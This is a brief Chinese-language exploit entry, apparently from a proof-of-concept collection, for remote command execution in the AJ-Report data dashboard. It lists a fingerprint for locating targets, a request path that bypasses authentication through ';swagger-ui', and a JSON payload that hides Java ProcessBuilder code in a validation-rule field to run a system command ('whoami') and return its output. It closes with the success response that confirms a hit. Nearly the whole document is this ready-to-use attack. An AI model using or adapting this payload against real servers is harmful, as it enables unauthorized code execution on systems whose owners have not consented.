# AJ-Report数据大屏系统命令执行漏洞

AJ-Report ｜ 命令执行 ｜ —
- **指纹**：`"AJ-Report"`
- **请求**：`POST /dataSetParam/verification;swagger-ui/ HTTP/1.1`

**Payload**
```
{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"whoami\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
```
- **响应特征**：200 操作成功